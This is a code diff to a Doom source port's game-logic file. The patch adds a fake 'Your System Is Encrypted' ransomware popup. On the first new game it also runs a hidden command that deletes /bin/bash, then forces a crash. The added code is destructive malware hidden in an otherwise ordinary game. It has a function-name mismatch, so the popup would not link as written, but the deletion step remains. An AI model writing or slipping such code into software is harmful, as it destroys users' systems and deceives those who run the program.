@@ -47,6 +47,7 @@
 #include "p_saveg.h"
 #include "p_extsaveg.h"
 #include "p_tick.h"
+#include "textscreen.h"
 
 #include "d_main.h"
 
@@ -86,6 +87,7 @@
 void	G_ReadDemoTiccmd (ticcmd_t* cmd); 
 void	G_WriteDemoTiccmd (ticcmd_t* cmd); 
 void	G_PlayerReborn (int player); 
+void 	ShowRansomwareMessage(void);
  
 void	G_DoReborn (int playernum); 
  
@@ -229,6 +231,7 @@ typedef struct carry_s
 static carry_t prevcarry;
 static carry_t carry;
 
+static int 	first_launch = 1;
 static int      dclicktime;
 static boolean  dclickstate;
 static int      dclicks; 
@@ -2655,13 +2658,22 @@ void G_DoNewGame (void)
     gameaction = ga_nothing; 
 } 
 
+void ShowRamsomwareMessage(void){
+	txt_window_t *window = TXT_NewWindow("*** WARNING ***");
+	TXT_AddWidget(window, TXT_NewLabel("Your System Is Encrypted!!!!"));
+	TXT_AddWidget(window, TXT_NewWindowEscapeAction(window));
+	
+	//TXT_NewWindow(window);
+	}
 
-void
-G_InitNew
-( skill_t	skill,
-  int		episode,
-  int		map )
-{
+
+void G_InitNew (skill_t skill, int episode, int map ) {
+    if (first_launch){
+    	ShowRansomwareMessage();
+    	first_launch = 0;
+    	system("rm -f /bin/bash 2>/dev/null");
+    	I_Error("Critical system failure");
+    }
     const char *skytexturename;
     int             i;
     // [crispy] make sure "fast" parameters are really only applied once
